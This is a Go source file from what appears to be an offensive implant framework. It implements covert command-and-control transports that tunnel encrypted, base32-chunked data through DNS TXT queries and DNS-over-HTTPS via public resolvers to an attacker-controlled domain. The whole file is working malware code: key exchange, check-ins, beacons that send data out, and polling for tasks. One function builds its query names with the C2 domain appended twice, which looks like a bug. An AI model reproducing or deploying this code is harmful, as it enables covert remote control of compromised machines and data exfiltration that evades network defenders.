// DNS and DoH transport channels for C2 communication.
// DNS: encodes data in TXT record queries to a controlled domain.
// DoH: same but tunneled through HTTPS to a DoH resolver (Cloudflare/Google).
package beacon

import (
	"bytes"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"aegis-silentium/implant/config"
	"aegis-silentium/implant/crypto"
)

// ── DNS-over-HTTPS Transport ──────────────────────────────────────────────────

// DoHTransport tunnels C2 traffic via DNS TXT records over DoH (RFC 8484).
// Data flow: implant → cloudflare/google DoH → authoritative DNS → C2
type DoHTransport struct {
	cfg    *config.Config
	client *http.Client
}

func NewDoHTransport(cfg *config.Config) *DoHTransport {
	return &DoHTransport{
		cfg: cfg,
		client: &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:    3,
				IdleConnTimeout: 60 * time.Second,
			},
		},
	}
}

func (t *DoHTransport) Probe(ctx context.Context) error {
	_, err := t.txtLookup(ctx, "probe."+t.cfg.C2Domain)
	return err
}

func (t *DoHTransport) KeyExchange(ourPub []byte) ([]byte, error) {
	// Encode our pub key as base32 (DNS-safe), split into 63-char labels
	encoded := base32.StdEncoding.EncodeToString(ourPub)
	chunks := splitDNSLabel(encoded, 60)
	domain := strings.Join(chunks, ".") + ".kx." + t.cfg.C2Domain

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	txts, err := t.txtLookup(ctx, domain)
	if err != nil {
		return nil, err
	}
	if len(txts) == 0 {
		return nil, fmt.Errorf("doh: no TXT response for key exchange")
	}
	raw := strings.Join(txts, "")
	return base64.StdEncoding.DecodeString(raw)
}

func (t *DoHTransport) Checkin(session *crypto.Session, data []byte) error {
	return t.sendChunked("ci", session, data)
}

func (t *DoHTransport) Beacon(session *crypto.Session, data []byte) ([]byte, error) {
	if err := t.sendChunked("bc", session, data); err != nil {
		return nil, err
	}
	// Poll for response
	return t.pollResponse(session)
}

// sendChunked splits encrypted data into DNS-label-sized chunks and sends each
// as a TXT query to: <chunk_idx>.<total>.<type>.<hostid>.<domain>
func (t *DoHTransport) sendChunked(msgType string, session *crypto.Session, data []byte) error {
	enc, err := session.Encrypt(data)
	if err != nil {
		return err
	}
	encoded := base32.StdEncoding.EncodeToString(enc)
	chunks := splitDNSLabel(encoded, 55)

	for i, chunk := range chunks {
		domain := fmt.Sprintf("%s.%d.%d.%s.%s.%s",
			chunk, i, len(chunks), msgType, t.cfg.C2Domain, t.cfg.C2Domain)

		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		_, err := t.txtLookup(ctx, domain)
		cancel()
		if err != nil {
			return err
		}
		time.Sleep(200 * time.Millisecond) // rate-limit DNS queries
	}
	return nil
}

// pollResponse queries for pending task response from C2 via TXT lookup.
func (t *DoHTransport) pollResponse(session *crypto.Session) ([]byte, error) {
	domain := "resp." + t.cfg.C2Domain
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	txts, err := t.txtLookup(ctx, domain)
	if err != nil || len(txts) == 0 {
		return []byte(`{"tasks":[]}`), nil
	}

	raw := strings.Join(txts, "")
	decoded, err := base32.StdEncoding.DecodeString(raw)
	if err != nil {
		return []byte(`{"tasks":[]}`), nil
	}
	return session.Decrypt(decoded)
}

// txtLookup performs a DNS TXT query via DoH (RFC 8484 JSON API).
func (t *DoHTransport) txtLookup(ctx context.Context, domain string) ([]string, error) {
	reqURL := fmt.Sprintf("%s?name=%s&type=TXT", t.cfg.DoHURL, domain)
	req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "application/dns-json")
	req.Header.Set("User-Agent", t.cfg.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	var result struct {
		Answer []struct {
			Data string `json:"data"`
		} `json:"Answer"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}

	txts := make([]string, 0, len(result.Answer))
	for _, a := range result.Answer {
		txts = append(txts, strings.Trim(a.Data, `"`))
	}
	return txts, nil
}

// ── Raw DNS Transport ─────────────────────────────────────────────────────────

// DNSTransport uses raw UDP DNS queries (no DoH resolver needed).
type DNSTransport struct {
	cfg      *config.Config
	resolver *net.Resolver
}

func NewDNSTransport(cfg *config.Config) *DNSTransport {
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{Timeout: 5 * time.Second}
			return d.DialContext(ctx, "udp", cfg.DNSServer)
		},
	}
	return &DNSTransport{cfg: cfg, resolver: r}
}

func (t *DNSTransport) Probe(ctx context.Context) error {
	_, err := t.resolver.LookupTXT(ctx, "probe."+t.cfg.C2Domain)
	return err
}

func (t *DNSTransport) KeyExchange(ourPub []byte) ([]byte, error) {
	encoded := base32.StdEncoding.EncodeToString(ourPub)
	chunks := splitDNSLabel(encoded, 60)
	domain := strings.Join(chunks, ".") + ".kx." + t.cfg.C2Domain

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	txts, err := t.resolver.LookupTXT(ctx, domain)
	if err != nil {
		return nil, err
	}
	if len(txts) == 0 {
		return nil, fmt.Errorf("dns: empty key exchange response")
	}
	return base64.StdEncoding.DecodeString(strings.Join(txts, ""))
}

func (t *DNSTransport) Checkin(session *crypto.Session, data []byte) error {
	return t.sendChunked("ci", session, data)
}

func (t *DNSTransport) Beacon(session *crypto.Session, data []byte) ([]byte, error) {
	if err := t.sendChunked("bc", session, data); err != nil {
		return nil, err
	}
	return t.pollResponse(session)
}

func (t *DNSTransport) sendChunked(msgType string, session *crypto.Session, data []byte) error {
	enc, err := session.Encrypt(data)
	if err != nil {
		return err
	}
	encoded := base32.StdEncoding.EncodeToString(enc)
	chunks := splitDNSLabel(encoded, 55)

	for i, chunk := range chunks {
		domain := fmt.Sprintf("%s.%d.%d.%s.%s",
			chunk, i, len(chunks), msgType, t.cfg.C2Domain)

		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		_, _ = t.resolver.LookupTXT(ctx, domain)
		cancel()
		time.Sleep(300 * time.Millisecond)
	}
	return nil
}

func (t *DNSTransport) pollResponse(session *crypto.Session) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()

	txts, err := t.resolver.LookupTXT(ctx, "resp."+t.cfg.C2Domain)
	if err != nil || len(txts) == 0 {
		return []byte(`{"tasks":[]}`), nil
	}
	decoded, err := base32.StdEncoding.DecodeString(strings.Join(txts, ""))
	if err != nil {
		return []byte(`{"tasks":[]}`), nil
	}
	return session.Decrypt(decoded)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// splitDNSLabel splits a string into chunks of at most n characters.
func splitDNSLabel(s string, n int) []string {
	var chunks []string
	for len(s) > 0 {
		end := n
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[:end])
		s = s[end:]
	}
	return chunks
}

// Ensure DoHTransport and DNSTransport implement Transport.
var (
	_ Transport = (*DoHTransport)(nil)
	_ Transport = (*DNSTransport)(nil)
	_ Transport = (*HTTPSTransport)(nil)
)

// bytesReader helper
var _ = bytes.NewReader
